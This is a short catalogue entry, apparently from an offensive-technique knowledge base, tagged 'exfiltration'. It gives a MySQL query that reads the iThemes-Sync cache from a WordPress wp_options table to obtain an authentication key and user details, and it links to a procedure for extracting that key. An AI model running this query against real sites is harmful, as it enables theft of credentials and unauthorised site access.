---
id: cmd-sql-query-006
data: 'SELECT option_value FROM [REDACTED] WHERE option_name=''ithemes-sync-cache'''
tags:
  - exfiltration
type: command
output: null
executor: sql
platforms:
  - MySQL
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.980Z'
verified: false
validated: true
submitted: true
---
# sql-query-ithemes-cache

## Command

```sql
SELECT option_value FROM [REDACTED] WHERE option_name='ithemes-sync-cache'
```

## Description

Queries wp_options for iThemes-Sync cache containing auth key.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `option_name` | 'ithemes-sync-cache' | Yes |

## Examples

### Basic Usage

```sql
SELECT option_value FROM wp_options WHERE option_name='ithemes-sync-cache';
```

## Expected Output

Serialized array with key and user details.

## Related

- [[Related Procedure: Extract-iThemes-Sync-Auth-Key]]
